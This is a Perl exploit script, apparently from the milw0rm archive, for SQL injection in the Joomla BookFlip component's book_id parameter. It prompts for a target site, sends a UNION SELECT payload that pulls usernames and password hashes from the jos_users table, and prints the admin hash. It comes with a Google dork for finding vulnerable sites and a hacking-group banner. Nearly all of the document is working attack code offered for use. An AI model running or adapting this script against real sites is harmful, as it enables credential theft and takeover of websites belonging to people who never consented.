#!/usr/bin/perl -w

#Joomla com_bookflip(book_id) Sql injection#
########################################
#[~] Author : boom3rang
#[~] Greetz : H!tm@N - KHG - cHs - LiTTLE-HaCkEr - SpywarrioR - cRu3l.b0y - Lanti-Net - urtan
#---------------------------------------
#[!] <name>BookFlip</name>
#[!] <creationDate>Juin 2008</creationDate>
#[!] <author>FCI F-Cimag-In</author>
#[!] <copyright>Ce composant est distribuÃ© gratuitement.</copyright>
#[!] <authorEmail>postmaster@f-cimag-in.com</authorEmail>
#[!] <authorUrl>www.f-cimag-in.com</authorUrl>
#[!] <version>2.1</version>
#---------------------------------------
#[!] Google_Dork: inurl:"com_bookflip"
########################################

system("color FF0000");
print "\t ###############################################################\n\n";
print "\t #           Kosova Hackers Group (KHG-CREW)                   #\n\n";
print "\t ###############################################################\n\n";
print "\t # - Joomla com_bookflip(book_id)Remote SQL Injection Vuln     #\n\n";
print "\t # - R.I.P redc00de                                            #\n\n";
print "\t # - Cod3d by boom3rang                                        #\n\n";
print "\t ###############################################################\n\n";
use LWP::UserAgent;
print "\nTarget page:[http://wwww.localhost/pathdir/]: ";
chomp(my $target=<STDIN>);
#Column Name
$c_n="concat(username,0x3a,password)";
#Table_name
$t_n="jos_users";
$U="-9999+UNION+SELECT+";
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$host = $target . "/index.php?option=com_bookflip&book_id=".$U."1,".$c_n.",3,4,5,6,7,8,9,0,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37+from/**/".$t_n."+--+";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-fA-F]{32})/){
print "\n[+] Admin Hash : $1\n\n";
print "# Veprimi mbaroi me sukses(Congratulations)! #\n\n";
}
else{print "\n[-] Veprimi Deshtoi (Not Found)...\n";
}

########################
# - Proud 2 be Albanian
# - Proud 2 be Muslim
########################

# milw0rm.com [2009-06-29]